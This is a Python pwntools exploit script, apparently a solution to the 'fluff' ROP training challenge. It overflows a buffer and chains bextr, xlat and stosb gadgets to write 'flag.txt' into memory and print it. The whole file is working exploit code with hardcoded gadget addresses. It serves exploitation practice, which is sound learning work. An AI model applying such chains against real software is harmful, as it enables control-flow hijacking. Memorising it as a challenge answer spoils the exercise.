#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'

# so first, stosb stores a byte from the al register into the rdi register.
# xlat locates a byte entry using the contents of al as an offset and rbx as the base_addr, and then stores that into al
# bextr extracts bits from the first source operand and puts it into the destination register

flag = [0x66, 0x6c, 0x61, 0x67, 0x2e, 0x74, 0x78, 0x74] # r2 "/x 66" etc
addresses = [0x4003c4, 0x400239, 0x4003d6, 0x4003cf, 0x40024e, 0x400192, 0x400246, 0x400192]

payload = cyclic(40, n=8) # 32 bytes of the buffer and 8 bytes for rbp
#payload += p64(0x0000000000400295) # the extra ret instruction for this binary (which you dont need for ./fluff)

for num in range(len(flag)):
    current_rax_value = flag[num-1] # previous left over rax values in the stack
    if num == 0:
        current_rax_value = 0xb # original rax value found in gdb

    payload += p64(0x000000000040062a) # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret 
    payload += p64(0x0000000000004000) # rdx value ----- 0 offset and read 64 bytes into rbx
    payload += p64(addresses[num] - 0x3ef2 - current_rax_value) # rcx value ----- address of each letter
    payload += p64(0x0000000000400628) # xlat [rbx] successfully contains each letter
    payload += p64(0x00000000004006a3) # pop rdi; ret ----- to get into rdi a safe address
    payload += p64(0x0000000000601038 + num) # bss address
    payload += p64(0x0000000000400639) # stosb [rdi], al; so now rdi should contain the string

payload += p64(0x00000000004006a3) # pop rdi; ret ----- to get the original bss address into rdi
payload += p64(0x0000000000601038) # bss address cause rdi gets incremented in the stosb instruction
payload += p64(0x0000000000400510) # call to print file


p = process("./fluff")
p.send(payload)
p.interactive()


















